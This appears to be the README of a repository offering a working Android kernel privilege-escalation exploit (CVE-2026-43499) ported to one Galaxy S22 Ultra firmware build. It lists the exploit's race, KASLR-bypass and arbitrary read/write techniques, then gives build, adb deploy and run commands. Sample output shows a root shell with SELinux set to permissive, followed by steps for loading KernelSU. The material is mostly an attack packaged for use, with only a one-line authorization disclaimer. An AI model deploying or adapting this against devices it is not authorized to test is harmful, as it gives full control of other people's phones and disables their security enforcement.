This repository contains a device-specific port of the CVE-2026-43499
exploit for the Samsung Galaxy S22 Ultra (SM-S908W).

## Supported target

```text
Device: Samsung Galaxy S22 Ultra (SM-S908W)
Codename: b0q
Android: 15 / SDK 35
Build number: AP3A.240905.015.A2.S908WVLS8FYG7
Build display ID: AP3A.240905.015.A2.S908WVLS8FYG7

## Main porting changes

- Ported exploit from v6.6 kernel (Galaxy S25 Ultra) to Android v5.10 kernel (Galaxy S22 Ultra / b0q).
- Added the `b0q` / `S908WVLS8FYG7` target offsets (`src/targets/S908WVLS8FYG7/target.h`) and kernel structure layouts.
- Replaced the pselect race with the `exp32` route: futex choreography, 32-bit stack stamp, and `sched_setattr` run in an embedded 32-bit child stage (`src/exp32/`).
- Added tracefs-based automatic KASLR slide recovery for the Samsung kernel.
- Ported fake PI waiter/task layout, CFI/FOPS stage, and physical read/write primitive for v5.10.
- Added a KDP-safe `system_unbound_wq` user-mode-helper root path and updated runtime SELinux enforcement target to `selinux_state.enforcing`.
- Added a socket-backed root command helper at
  `/data/local/tmp/cve-2026-43499-root`.
- Restores the global ashmem FOPS pointer immediately after establishing the
  arbitrary read/write primitive.
- Retains reclaimed pages in a detached `cve43499-hold` process after success
  so dangling kernel references cannot be recycled into unrelated slab objects.
- Runs failed race attempts in independent child processes and automatically
  retries with a device-tuned delay sequence.

## Build

Set `ANDROID_NDK_HOME` to Android NDK r27+ or a compatible toolchain, then run:

```sh
make PROJECT=S908WVLS8FYG7 clean preload root-helper
```

To build for a QEMU environment running the Android kernel with a Buildroot filesystem:
- **Buildroot Toolchain Release**: Download toolchain from [sarabpal-dev/qemu Release (samsung-v1)](https://github.com/sarabpal-dev/qemu/releases/tag/samsung-v1)
- **QEMU Kernel Execution Guide**: Setup and run guide at [QEMU Samsung README](https://github.com/sarabpal-dev/qemu/blob/samsung/docs/samsung/README.md)

```sh
make USE_BUILDROOT=1 PROJECT=S908WVLS8FYG7 clean preload root-helper
```

Outputs:

```text
build/S908WVLS8FYG7/bin/cve-2026-43499
build/S908WVLS8FYG7/bin/cve-2026-43499-root
build/S908WVLS8FYG7/bin/cve-exp32
```

## Deploy

```sh
adb push build/S908WVLS8FYG7/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/S908WVLS8FYG7/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push build/S908WVLS8FYG7/bin/cve-exp32 /data/local/tmp/cve-exp32
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root /data/local/tmp/cve-exp32
```

## Run

Execute the exploit stage to start the root daemon:

```sh
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

Once successful, pop an interactive root shell from anywhere on the device:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root"
```

Or execute root commands directly:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

The default run makes up to 16 independent attempts. Each failed child exits
before the next attempt, so its file descriptors and heap-shaping allocations
are released instead of accumulating inside one long-lived exploit process.
The default base delay is `20000` microseconds and the supervisor sweeps the
following sequence twice:

```text
20000, 30000, 50000, 25000, 40000, 15000, 60000, 35000
```

Override the attempt count or base delay when collecting timing data:

```sh
adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

Verified result on `S908WVLS8FYG7`:

```text
[*] root umh result wake=1 complete=1 retval=0 socket=1
[+] pipe-physrw-summary pid=5011 done=1 root=1 kaslr=1 base=ffffffc0080d8000 slide=00000000000d8000
[+] pipe physrw pid=5011 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] stability keeper pid=28206 retaining reclaimed kernel pages
[+] exploit completed attempt=1/16
```

Interactive root shell session:

```text
b0q:/data/local/tmp $ ./cve-2026-43499-root                              
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
:/ # getenforce
Permissive
```

The initial stage is race-based. A child that exits with `root=0`
is retried automatically. Successful execution restores `ashmem_misc.fops`, switches SELinux to permissive, and starts the root helper daemon until the next reboot.

## Persistent root with KernelSU-Next

The exploit above only holds root for the current boot. To get a Manager app and `su`-style control for the rest of the session, load [KernelSU-Next](https://github.com/sarabpal-dev/KernelSU-Next) as a late-load kernel module through the root helper.

1. Download both release assets from [`v3.3.0-android12-5.10`](https://github.com/sarabpal-dev/KernelSU-Next/releases/tag/v3.3.0-android12-5.10):
   - [`KernelSU_Next_v3.3.0-release.apk`](https://github.com/sarabpal-dev/KernelSU-Next/releases/download/v3.3.0-android12-5.10/KernelSU_Next_v3.3.0-release.apk) — Manager app
   - [`kernelsu-android12-5.10.ko`](https://github.com/sarabpal-dev/KernelSU-Next/releases/download/v3.3.0-android12-5.10/kernelsu-android12-5.10.ko) — LKM kernel module

2. Install the Manager APK:

```sh
adb install KernelSU_Next_v3.3.0-release.apk
```

3. Push the module and load it through the root helper obtained above:

```sh
adb push kernelsu-android12-5.10.ko /data/local/tmp/kernelsu-android12-5.10.ko
adb shell "/data/local/tmp/cve-2026-43499-root -c 'insmod /data/local/tmp/kernelsu-android12-5.10.ko'"
```

4. Open the KernelSU Next app on the device — it should detect the loaded module and expose superuser management, module/Zygisk support, and `ksud soft-reboot`.

Since this is a late-loaded LKM (not a patched boot image), it does not survive a reboot — you'll need to re-run the exploit and re-`insmod` the module each time the device restarts.

> [!WARNING]
> **Reliability & Kernel Panic Notice:**
> The race stage is timing-sensitive and currently unreliable—it may fail or cause a kernel panic on most runs. Be patient, as clean boots offer a higher success rate. Future optimizations may be released to improve reliability.

> [!TIP]
> **Stability & Success Rate Recommendations:**
> - **Reboot Device**: For the highest success rate, reboot the device before running the exploit to ensure clean slab/heap state.
> - **Close Background Apps**: Ensure all background applications are closed.
> - **Unlock Screen & Stay Idle**: Keep the device unlocked and do not interact with or use the phone while the exploit is running, as active user input/background tasks can disturb timing and potentially trigger a kernel panic.

Use only on devices you own or are explicitly authorized to test.
